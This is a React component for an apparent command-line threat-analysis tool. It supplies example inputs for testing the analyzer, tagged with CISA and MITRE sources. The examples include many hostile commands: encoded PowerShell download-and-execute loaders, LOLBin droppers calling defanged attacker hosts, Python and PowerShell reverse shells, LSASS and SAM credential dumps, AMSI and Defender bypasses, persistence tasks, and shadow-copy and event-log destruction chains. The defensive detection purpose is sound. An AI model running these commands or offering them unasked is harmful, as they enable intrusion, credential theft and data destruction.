"use client";

import { useState } from "react";

type Category = "All" | "Encoding" | "LOLBAS" | "GTFOBins" | "Credentials" | "Persistence" | "Defense Evasion" | "Real-World";

type Example = {
  label: string;
  description: string;
  category: Exclude<Category, "All">;
  command: string;
  hint?: string;
  source?: string;
  sourceUrl?: string;
};

const EXAMPLES: Example[] = [
  // ── Encoding ────────────────────────────────────────────────────────────────
  {
    label: "Encoded PowerShell (UTF-16LE)",
    description: "JAB prefix → UTF-16LE base64 — classic Lumma/Latrodectus loader pattern",
    category: "Encoding",
    command: `powershell.exe -NonInteractive -WindowStyle Hidden -EncodedCommand JABjACAAPQAgAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ADsAIAAkAGMALgBEAG8AdwBuAGwAbwBhAGQARgBpAGwAZQAoACIAaAB0AHQAcAA6AC8ALwBjAGQAbgAuAHMAdABhAGcAZQAyAC0AZAByAG8AcABbAC4AXQB4AHkAegAvAHMAdgBjAC4AZQB4AGUAIgAsACIAQwA6AFwAUAByAG8AZwByAGEAbQBEAGEAdABhAFwAcwB2AGMALgBlAHgAZQAiACkAOwAgAFMAdABhAHIAdAAtAFAAcgBvAGMAZQBzAHMAIAAiAEMAOgBcAFAAcgBvAGcAcgBhAG0ARABhAHQAYQBcAHMAdgBjAC4AZQB4AGUAIgA=`,
  },
  {
    label: "Gzip-compressed payload",
    description: "H4sI prefix → gzip inside base64 — used by ClickFix and QakBot stages",
    category: "Encoding",
    command: `powershell -c "$b=[System.Convert]::FromBase64String('H4sIAAAAAAAA/6tWKkktLlGyUlIqS40vLUpVslIqLU4tykvMTQUA6nU3RDEAAAA=');$gz=New-Object IO.Compression.GZipStream((New-Object IO.MemoryStream(,$b)),[IO.Compression.CompressionMode]::Decompress);$sr=New-Object IO.StreamReader($gz);iex $sr.ReadToEnd()"`,
  },
  {
    label: "2-layer: gzip → base64 (nested loader)",
    description: "Outer gzip layer decompresses to a PS command containing a second base64 payload — 2 decode passes required",
    category: "Encoding",
    command: `powershell -c "$b=[System.Convert]::FromBase64String('H4sIAGHJ/2kC/zXMXQ+BUByA8a9izQU3DcnEusB6QQwd5WQu0v9Mh061OqX69LJx++y3pwvq1a5zTpiISMVFLQ4SoPHjNpudkT4VDcJtnrWh92erJC5JxlugZwlb+jmZjH9EsM8O3mpyBPXwgFkaYen4QMwZWBFE+LXPfdcpYPUqToYi3VlVYveEwNykdxYkaxYOwFxMrFp57qjcgKHHHlpzz9yUgZ4Xl0soE6qE3uj7kN9Bo9HtUVWFfn9OSdXpwgcnTaH1zAAAAA==');$gz=New-Object IO.Compression.GZipStream((New-Object IO.MemoryStream(,$b)),[IO.Compression.CompressionMode]::Decompress);$sr=New-Object IO.StreamReader($gz);iex $sr.ReadToEnd()"`,
  },
  {
    label: "2-layer: EncodedCommand → gzip payload (exfil)",
    description: "UTF-16LE EncodedCommand wrapping a gzip-compressed Invoke-WebRequest exfiltration stage",
    category: "Encoding",
    command: `powershell -NonInteractive -WindowStyle Hidden -EncodedCommand JABiAD0AWwBTAHkAcwB0AGUAbQAuAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACIASAA0AHMASQBBAE4ATABJAC8AMgBrAEMALwB3ADMASwBzAFEANgBDAE0AQgBBAEcANABGAGUANQBVAFkAYQBqAE8AeQBNAE8AUgBoAE0AaQBVAFkAeQBEAGMAYQBqADIATgB5AFcAYQBuAHIAUgBIAEEAOABTAEgAbAAvAG4ANwA5AGkASABMAEcAMwB6AEYANAA0AFIAaABSAEYATABpAFMAKwB6AEoAcQAzADQAcgBZAHoAQwA5ACsAawAvAHAAcgBGAHIAMgBOAHUAYQBWAGIAKwBWADkAbQBoAGMAagA0AHgAbwBiAHEAQgBkAEgANwBmAEgAYwBFAGQAZgBpAFoAdAByAHMAbwBOAHgARwBlAFMASQBsACsAdABGAFcAUQBrAGIAVQBUAHYAaQBRAEoAQgBSAC8AcQArAEMAbQBCADIAdwBBAEEAQQBBAD0AIgApADsAJABnAHoAPQBOAGUAdwAtAE8AYgBqAGUAYwB0ACAASQBPAC4AQwBvAG0AcAByAGUAcwBzAGkAbwBuAC4ARwBaAGkAcABTAHQAcgBlAGEAbQAoACgATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACgALAAkAGIAKQApACwAWwBJAE8ALgBDAG8AbQBwAHIAZQBzAHMAaQBvAG4ALgBDAG8AbQBwAHIAZQBzAHMAaQBvAG4ATQBvAGQAZQBdADoAOgBEAGUAYwBvAG0AcAByAGUAcwBzACkAOwAkAHMAcgA9AE4AZQB3AC0ATwBiAGoAZQBjAHQAIABJAE8ALgBTAHQAcgBlAGEAbQBSAGUAYQBkAGUAcgAoACQAZwB6ACkAOwBpAGUAeAAgACQAcwByAC4AUgBlAGEAZABUAG8ARQBuAGQAKAApAA==`,
  },
  {
    label: "3-layer: EncodedCommand → gzip → base64 (staged loader)",
    description: "Three decode passes: UTF-16LE b64 → gzip-compressed PS → inner base64 payload. Common in commodity malware stagers.",
    category: "Encoding",
    command: `powershell -nop -w hidden -ep bypass -EncodedCommand JABiAD0AWwBTAHkAcwB0AGUAbQAuAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACIASAA0AHMASQBBAEgAWABKAC8AMgBrAEMALwB6AFgASwBPAHcANgBDAE0AQQBBAEEAMABLAHMAWQA0AGkAQQBMAE0AVwBnAE4AYQBsAHgARQBxAEkAQwBmAHkARQBlAHcAeABvAEgAUwBSAGgAcQB3AEkAQgBRAEUAVAA2ACsARAByAGkAOQB2AFcASwA2AHUAWABsADgATAArAGwAQgA4ADIAZwBuAEYANABFAGwAQgBHAEwALwBmAEYAbwB2AEEATgB6AFUARgBVAHUARwBKADYAZwB1AGoAZgA5AE0ATAAzAHQASgBLAGYASQBOAFoARgBZADkAMQBYAE4AUABaADkARgBjAGsATAB6AGgAZgBIAEQAMAA5AG8AaQBnAFIAdgBtAG8ALwBVAFgAZwBZAFcAdwBiAEkAaQBRADQAaQBGAE4AbwBiAEQAUABNAGMAOAAxAE8ANQB5ADkAeQBXAHEASwBEAEcAcQBwAGsARgBFADcAZQBQAFEAOABBAGQAMwBTADcASQAxAG4AMABkAG0AZABaAGUAMwBsAGEARAA0AFQAeABGADgATgB6AHYAdwBrAE8ARwA4ADcAcQBKAG8AaABSAFEATgBuADgAVABhAEgATABrADcANQB0AGsAdQArADgAcwBsAHAAVwBTAEwAQwA4AFoANwBRAGIARAA4AGcATgBhAHgAcgAzAEQAegBBAEEAQQBBAEEAPQA9ACIAKQA7ACQAZwB6AD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgAuAEcAWgBpAHAAUwB0AHIAZQBhAG0AKAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABJAE8ALgBNAGUAbQBvAHIAeQBTAHQAcgBlAGEAbQAoACwAJABiACkAKQAsAFsASQBPAC4AQwBvAG0AcAByAGUAcwBzAGkAbwBuAC4AQwBvAG0AcAByAGUAcwBzAGkAbwBuAE0AbwBkAGUAXQA6ADoARABlAGMAbwBtAHAAcgBlAHMAcwApADsAJABzAHIAPQBOAGUAdwAtAE8AYgBqAGUAYwB0ACAASQBPAC4AUwB0AHIAZQBhAG0AUgBlAGEAZABlAHIAKAAkAGcAegApADsAaQBlAHgAIAAkAHMAcgAuAFIAZQBhAGQAVABvAEUAbgBkACgAKQA=`,
  },

  // ── LOLBAS (Windows) ────────────────────────────────────────────────────────
  {
    label: "ClickFix mshta",
    description: "HTA JavaScript payload via mshta — LOLBAS + dropper, common ClickFix lure",
    category: "LOLBAS",
    command: `mshta "javascript:close();var r=new ActiveXObject('WScript.Shell');r.Run('powershell -ep bypass -w hidden -c \"iex((New-Object Net.WebClient).DownloadString(\'hxxps://cdn.update-browser[.]xyz/fix.ps1\'))\"',0,true);"`,
  },
  {
    label: "certutil file download",
    description: "LOLbin file download via certutil -urlcache — drops and executes",
    category: "LOLBAS",
    command: `certutil.exe -urlcache -split -f hxxp://cdn.delivery-update[.]xyz/update.exe C:\\Windows\\Temp\\svchost32.exe & C:\\Windows\\Temp\\svchost32.exe`,
  },
  {
    label: "regsvr32 remote scriptlet",
    description: "Squiblydoo — regsvr32 executes a remote .sct COM scriptlet, bypasses AppLocker",
    category: "LOLBAS",
    command: `regsvr32.exe /s /n /u /i:hxxp://cdn.malware-dl[.]xyz/payload.sct scrobj.dll`,
  },
  {
    label: "bitsadmin download + exec",
    description: "BITS job used as LOLbin downloader — evades many proxy filters",
    category: "LOLBAS",
    command: `bitsadmin /transfer "WindowsUpdate" /download /priority normal hxxp://update-svc[.]xyz/patch.exe C:\\Windows\\Temp\\patch.exe & C:\\Windows\\Temp\\patch.exe /quiet`,
  },

  // ── GTFOBins (Linux/Unix) ───────────────────────────────────────────────────
  {
    label: "curl | bash",
    description: "Remote script download piped directly into bash — classic Linux dropper",
    category: "GTFOBins",
    command: `curl -fsSL hxxps://cdn.packages-update[.]xyz/install.sh | bash -s -- --no-verify`,
  },
  {
    label: "Python reverse shell (base64)",
    description: "python3 exec() of base64-encoded socket reverse shell — common post-exploit",
    category: "GTFOBins",
    command: `python3 -c "import base64,subprocess;exec(base64.b64decode('aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoJzEwLjAuMC4xJyw0NDQ0KSk7b3MuZHVwMihzLmZpbGVubygpLDApO29zLmR1cDIocy5maWxlbm8oKSwxKTtvcy5kdXAyKHMuZmlsZW5vKCksMik7').decode())"`,
  },

  // ── Credentials ─────────────────────────────────────────────────────────────
  {
    label: "LSASS dump (comsvcs)",
    description: "rundll32 + comsvcs MiniDump — in-memory LSASS dump, high fidelity signal",
    category: "Credentials",
    command: `C:\\Windows\\System32\\rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 624 C:\\Windows\\Temp\\lsass.dmp full`,
  },
  {
    label: "SAM/SYSTEM hive export",
    description: "reg save on SAM + SYSTEM + SECURITY — offline credential extraction prep",
    category: "Credentials",
    command: `reg save HKLM\\SAM C:\\Windows\\Temp\\SAM.hive & reg save HKLM\\SYSTEM C:\\Windows\\Temp\\SYSTEM.hive & reg save HKLM\\SECURITY C:\\Windows\\Temp\\SECURITY.hive`,
  },

  // ── Persistence ─────────────────────────────────────────────────────────────
  {
    label: "Scheduled task C2 beacon",
    description: "schtasks persistence with encoded PS beacon — disguised as MicrosoftEdge task",
    category: "Persistence",
    command: `schtasks /create /tn "MicrosoftEdgeUpdateCore" /tr "powershell -w hidden -ep bypass -enc JABwACAAPQAgACIAaAB0AHQAcAA6AC8ALwBjADIALgByAGUAZgByAGUAcwBoAC0AcwB2AGMAWwAuAF0AbgBlAHQALwBhAGcAZQBuAHQAIgA7AGkAZQB4ACgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJABwACkAKQA=" /sc hourly /mo 2 /ru SYSTEM /f`,
  },
  {
    label: "WMI lateral movement",
    description: "wmic /node: remote process creation — classic lateral movement to internal host",
    category: "Persistence",
    hint: "Set 'Parent process' to winword.exe to also see parent verdict",
    command: `wmic /node:10.10.5.20 /user:CORP\\Administrator process call create "cmd /c powershell -w hidden -ep bypass -c IEX((New-Object Net.WebClient).DownloadString('hxxp://c2.lateral-move[.]xyz/agent.ps1'))"`,
  },

  // ── Defense Evasion ─────────────────────────────────────────────────────────
  {
    label: "AMSI bypass + download",
    description: "Reflection-based AMSI patch disables AV scanning before payload fetch",
    category: "Defense Evasion",
    command: `powershell -ep bypass -c "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true); iex (New-Object Net.WebClient).DownloadString('hxxp://c2.sec-updates[.]org/payload.ps1')"`,
  },
  {
    label: "Defender disable + persist",
    description: "Disables real-time monitoring then installs a SYSTEM-level logon persistence",
    category: "Defense Evasion",
    command: `powershell.exe -ep bypass -c "Set-MpPreference -DisableRealtimeMonitoring $true; schtasks /create /tn 'WindowsSecurityHealth' /tr 'powershell -w hidden -ep bypass -c IEX((New-Object Net.WebClient).DownloadString(\'hxxp://c2.telemetry-svc[.]com/agent.ps1\'))' /sc onlogon /ru SYSTEM /f"`,
  },

  // ── Real-World Attacks ───────────────────────────────────────────────────────
  {
    label: "Volt Typhoon — NTDS credential extraction",
    description: "ntdsutil IFM dump creates an offline copy of NTDS.dit containing all AD password hashes. Documented as a primary Volt Typhoon (China-nexus) credential-access technique against US critical infrastructure.",
    category: "Real-World",
    source: "CISA AA23-144A",
    sourceUrl: "https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-144a",
    command: `ntdsutil.exe "ac i ntds" "ifm" "create full C:\\Users\\Public\\tmp" q q`,
  },
  {
    label: "Volt Typhoon — netsh port proxy C2 tunnel",
    description: "netsh portproxy forwards traffic to a hardcoded C2 IP, tunneling over allowed ports to evade perimeter controls. Part of Volt Typhoon's living-off-the-land (LOTL) persistent access toolkit.",
    category: "Real-World",
    source: "CISA AA23-144A",
    sourceUrl: "https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-144a",
    command: `netsh interface portproxy add v4tov4 listenport=50100 listenaddress=0.0.0.0 connectport=443 connectaddress=45.77.251.73`,
  },
  {
    label: "Conti ransomware — backup destruction chain",
    description: "From the leaked Conti ransomware playbook. Pre-encryption routine: deletes VSS snapshots, wipes the backup catalog, and disables Windows recovery — preventing restoration without paying ransom.",
    category: "Real-World",
    source: "CISA AA21-265A",
    sourceUrl: "https://www.cisa.gov/news-events/cybersecurity-advisories/aa21-265a",
    command: `cmd.exe /c vssadmin delete shadows /all /quiet & wbadmin delete catalog -quiet & bcdedit /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no & wmic shadowcopy delete`,
  },
  {
    label: "LockBit 3.0 — VSS + boot recovery disable",
    description: "LockBit 3.0 pre-encryption LOTL chain: removes shadow copies and disables boot recovery to prevent victim restoration. Sourced from the CISA/FBI/MS-ISAC joint advisory.",
    category: "Real-World",
    source: "CISA AA23-165A",
    sourceUrl: "https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-165a",
    command: `cmd.exe /c vssadmin.exe delete shadows /all /quiet & bcdedit.exe /set {default} recoveryenabled No & bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures & wbadmin delete catalog -quiet`,
  },
  {
    label: "HAFNIUM — Exchange web shell + certutil stager",
    description: "China-nexus HAFNIUM's ProxyLogon exploitation chain (March 2021): IIS worker spawns cmd, certutil LOLbin downloads the next-stage implant from attacker infrastructure.",
    category: "Real-World",
    hint: "Set parent process to 'w3wp.exe' to simulate IIS worker spawning cmd",
    source: "Microsoft Security Blog, 2021-03-02",
    sourceUrl: "https://www.microsoft.com/en-us/security/blog/2021/03/02/hafnium-targeting-exchange-servers/",
    command: `cmd.exe /c cd /d "C:\\inetpub\\wwwroot\\aspnet_client\\" & certutil.exe -urlcache -split -f hxxp://p.estonine[.]com/p & p`,
  },
  {
    label: "Qakbot — regsvr32 DLL loader",
    description: "Qakbot (QBot) initial execution: malicious DLL dropped to a public directory and loaded via regsvr32. Used as an initial-access loader staging Cobalt Strike beacons. Documented in the FBI/CISA advisory.",
    category: "Real-World",
    source: "CISA AA23-242A",
    sourceUrl: "https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-242a",
    command: `cmd.exe /c regsvr32.exe /s C:\\Users\\Public\\svhost.dll`,
  },
  {
    label: "FIN7 — mshta JavaScript dropper",
    description: "FIN7 (Carbanak) initial access: mshta executes an in-memory JavaScript payload spawning hidden PowerShell to download a C2 implant. Delivered via spear-phishing against hospitality and financial targets.",
    category: "Real-World",
    hint: "Set parent process to 'OUTLOOK.exe' or 'WINWORD.exe' to simulate phishing delivery",
    source: "MITRE ATT&CK G0046",
    sourceUrl: "https://attack.mitre.org/groups/G0046/",
    command: `mshta.exe javascript:a=new ActiveXObject("WScript.Shell");a.run("cmd /c powershell -ep bypass -w hidden -c IEX((New-Object Net.WebClient).DownloadString('hxxp://185.62.188[.]88/m/m.ps1'))",0,true);close();`,
  },
  {
    label: "APT41 — procdump LSASS credential harvest",
    description: "APT41 (Winnti/Barium, China-nexus) credential access: Sysinternals procdump dumps LSASS process memory for offline hash extraction. Observed across campaigns targeting healthcare, telecom, and gaming sectors.",
    category: "Real-World",
    source: "MITRE ATT&CK G0096",
    sourceUrl: "https://attack.mitre.org/groups/G0096/",
    command: `procdump.exe -accepteula -ma lsass.exe C:\\Windows\\Temp\\lsass.dmp`,
  },
  {
    label: "APT28 — Mimikatz pass-the-hash lateral movement",
    description: "APT28 (Fancy Bear, Russia-nexus) credential reuse technique: Mimikatz sekurlsa::pth spawns a cmd.exe process authenticated with a stolen NTLM hash — no plaintext password required. Enables lateral movement across Windows domains.",
    category: "Real-World",
    source: "MITRE ATT&CK G0007",
    sourceUrl: "https://attack.mitre.org/groups/G0007/",
    command: `mimikatz.exe "privilege::debug" "sekurlsa::pth /user:Administrator /domain:CORP /ntlm:a29f7161e2b9f69ee75b37ce1a9ac5af /run:cmd.exe" "exit"`,
  },
  {
    label: "APT29 — Rubeus Kerberoasting",
    description: "APT29 (Cozy Bear, Russia-nexus) Active Directory attack: Rubeus requests Kerberos service tickets for every SPN-registered account, then saves the TGS hashes for offline cracking. RC4-opsec mode avoids requesting AES tickets that trigger newer detections.",
    category: "Real-World",
    hint: "Run as a domain user — the higher the account privileges, the more SPNs visible",
    source: "MITRE ATT&CK G0016",
    sourceUrl: "https://attack.mitre.org/groups/G0016/",
    command: `.\\Rubeus.exe kerberoast /rc4opsec /nowrap /outfile:C:\\Windows\\Temp\\kerbhashes.txt`,
  },
  {
    label: "Turla — WMI event subscription fileless persistence",
    description: "Turla (Snake, Russia-nexus FSB) fileless persistence: creates a WMI FilterToConsumerBinding that executes a hidden PowerShell beacon every time the timer fires — survives reboots, leaves no file on disk, and is missed by most AV scans.",
    category: "Real-World",
    source: "MITRE ATT&CK G0010",
    sourceUrl: "https://attack.mitre.org/groups/G0010/",
    command: `powershell -c "$F=Set-WmiInstance -Namespace root\\subscription -Class __EventFilter -Arguments @{Name='WindowsUpdate';EventNameSpace='root\\cimv2';QueryLanguage='WQL';Query='SELECT * FROM __TimerEvent WHERE TimerID=\"Update\"'}; $C=Set-WmiInstance -Namespace root\\subscription -Class CommandLineEventConsumer -Arguments @{Name='WindowsUpdate';CommandLineTemplate='cmd /c powershell -ep bypass -w hidden -enc JABwACAAPQAgACIAaAB0AHQAcAA6AC8ALwBjADIALgByAGUAZgByAGUAcwBoAC0AcwB2AGMAWwAuAF0AbgBlAHQALwBhAGcAZQBuAHQAIgA7AGkAZQB4ACgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJABwACkAKQA='}; Set-WmiInstance -Namespace root\\subscription -Class __FilterToConsumerBinding -Arguments @{Filter=$F;Consumer=$C}"`,
  },
  {
    label: "Conti — post-encryption event log wipe",
    description: "Conti ransomware anti-forensics step executed after encryption: clears System, Security, Application, and PowerShell operational logs to hinder incident response. Documented in the leaked Conti playbook and CISA advisory.",
    category: "Real-World",
    source: "CISA AA21-265A",
    sourceUrl: "https://www.cisa.gov/news-events/cybersecurity-advisories/aa21-265a",
    command: `cmd.exe /c wevtutil cl System & wevtutil cl Security & wevtutil cl Application & wevtutil cl "Windows PowerShell" & wevtutil cl Microsoft-Windows-PowerShell/Operational & wevtutil cl Microsoft-Windows-TerminalServices-LocalSessionManager/Operational`,
  },
  {
    label: "Scattered Spider — PowerShell TCP reverse shell",
    description: "Scattered Spider (UNC3944) post-exploitation: pure PowerShell reverse shell using Net.Sockets.TcpClient — no binary dropped to disk. Pipes stdin/stdout over a raw TCP connection back to attacker C2. Observed in ransomware-precursor intrusions against hospitality and telecom.",
    category: "Real-World",
    hint: "Replace 192.168.1.100:4444 with attacker IP:port to simulate the full pattern",
    source: "CISA AA23-320A",
    sourceUrl: "https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-320a",
    command: `powershell -nop -w hidden -c "$c=New-Object Net.Sockets.TcpClient('192.168.1.100',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$rb=[Text.Encoding]::ASCII.GetBytes($r);$s.Write($rb,0,$rb.Length)}"`,
  },
  {
    label: "APT41 — 7-Zip password-protected data staging",
    description: "APT41 (Winnti/Barium) pre-exfiltration staging: recursively archives Office documents and PDFs from user directories into a password-protected, header-encrypted zip. Password and AES encryption obscure archive contents from DLP inspection.",
    category: "Real-World",
    source: "MITRE ATT&CK G0096",
    sourceUrl: "https://attack.mitre.org/groups/G0096/",
    command: `7z.exe a -tzip -p"StAging!" -mhe C:\\Windows\\Temp\\exfil.zip "C:\\Users\\*\\Documents\\*.docx" "C:\\Users\\*\\Desktop\\*.xlsx" "C:\\Users\\*\\Downloads\\*.pdf"`,
  },
];

const CATEGORIES: Category[] = [
  "All",
  "Encoding",
  "LOLBAS",
  "GTFOBins",
  "Credentials",
  "Persistence",
  "Defense Evasion",
  "Real-World",
];

const INITIAL_VISIBLE = 3;

export default function ExampleCommands({ onSelect }: { onSelect: (cmd: string) => void }) {
  const [active, setActive] = useState<Category>("All");
  const [expanded, setExpanded] = useState(false);

  const all = active === "All" ? EXAMPLES : EXAMPLES.filter((e) => e.category === active);
  const visible = expanded ? all : all.slice(0, INITIAL_VISIBLE);
  const hiddenCount = all.length - INITIAL_VISIBLE;

  function selectCategory(cat: Category) {
    setActive(cat);
    setExpanded(false);
  }

  return (
    <div className="w-full">
      <p className="section-label mb-3">Try an example</p>

      {/* Category filter */}
      <div className="flex flex-wrap gap-1.5 mb-3">
        {CATEGORIES.map((cat) => (
          <button
            key={cat}
            type="button"
            onClick={() => selectCategory(cat)}
            className={`text-xs px-2.5 py-1 rounded border transition-colors ${
              cat === "Real-World"
                ? active === cat
                  ? "border-red-500/70 text-red-400 bg-red-500/10"
                  : "border-red-500/30 text-red-400/70 hover:border-red-500/60 hover:text-red-400"
                : active === cat
                  ? "border-[var(--accent)] text-[var(--accent)] bg-[var(--surface)]"
                  : "border-[var(--border)] text-[var(--muted)] hover:border-[var(--accent)] hover:text-[var(--foreground)]"
            }`}
          >
            {cat}
          </button>
        ))}
      </div>

      {/* Disclaimer shown only for Real-World category */}
      {active === "Real-World" && (
        <div className="mb-3 px-3 py-2.5 border border-amber-500/30 bg-amber-500/5 rounded-lg text-xs text-amber-400/80 leading-relaxed">
          Commands sourced from public threat intelligence advisories (CISA, Microsoft MSRC, MITRE ATT&CK).
          These are documented IOCs from named threat actors — the same signals your threat feeds reference.
          Included to calibrate the analyzer against real adversary techniques.
        </div>
      )}

      <div className="flex flex-col gap-2">
        {visible.map((ex) => (
          /* div role="button" instead of <button> so nested <a> source links are valid HTML */
          <div
            key={ex.label}
            role="button"
            tabIndex={0}
            onClick={() => onSelect(ex.command)}
            onKeyDown={(e) => {
              if (e.key === "Enter" || e.key === " ") {
                e.preventDefault();
                onSelect(ex.command);
              }
            }}
            className={`text-left rounded-lg px-4 py-2.5 hover:bg-[var(--surface)] transition-colors group cursor-pointer border ${
              ex.source
                ? "border-red-500/25 hover:border-red-500/50"
                : "border-[var(--border)] hover:border-[var(--accent)]"
            }`}
          >
            <div className="flex items-start gap-2 flex-wrap">
              <span className="text-xs border border-[var(--border)] text-[var(--muted)] px-1.5 py-0.5 rounded shrink-0">
                {ex.category}
              </span>
              {ex.source && (
                <span className="text-xs border border-red-500/50 text-red-400 bg-red-500/10 px-1.5 py-0.5 rounded shrink-0 font-mono tracking-wide">
                  REAL IOC
                </span>
              )}
              <span className="text-sm font-semibold text-[var(--foreground)] group-hover:text-[var(--accent)] transition-colors">
                {ex.label}
              </span>
            </div>
            <p className="text-xs text-[var(--muted)] mt-1">{ex.description}</p>
            {ex.hint && (
              <p className="text-xs text-[var(--accent)] mt-0.5 opacity-70">{ex.hint}</p>
            )}
            {ex.source && (
              <div
                className="flex items-center gap-1 mt-1.5"
                onClick={(e) => e.stopPropagation()}
              >
                {ex.sourceUrl ? (
                  <a
                    href={ex.sourceUrl}
                    target="_blank"
                    rel="noopener noreferrer"
                    className="text-xs text-[var(--muted)] hover:text-[var(--accent)] underline underline-offset-2 transition-colors"
                  >
                    ↗ {ex.source}
                  </a>
                ) : (
                  <span className="text-xs text-[var(--muted)]">Source: {ex.source}</span>
                )}
              </div>
            )}
          </div>
        ))}
      </div>

      {hiddenCount > 0 && !expanded && (
        <button
          type="button"
          onClick={() => setExpanded(true)}
          className="mt-2 w-full text-xs text-[var(--muted)] hover:text-[var(--foreground)] border border-dashed border-[var(--border)] hover:border-[var(--accent)] rounded-lg py-2 transition-colors"
        >
          Show {hiddenCount} more example{hiddenCount !== 1 ? "s" : ""} ↓
        </button>
      )}
      {expanded && all.length > INITIAL_VISIBLE && (
        <button
          type="button"
          onClick={() => setExpanded(false)}
          className="mt-2 w-full text-xs text-[var(--muted)] hover:text-[var(--foreground)] border border-dashed border-[var(--border)] hover:border-[var(--accent)] rounded-lg py-2 transition-colors"
        >
          Show less ↑
        </button>
      )}
    </div>
  );
}
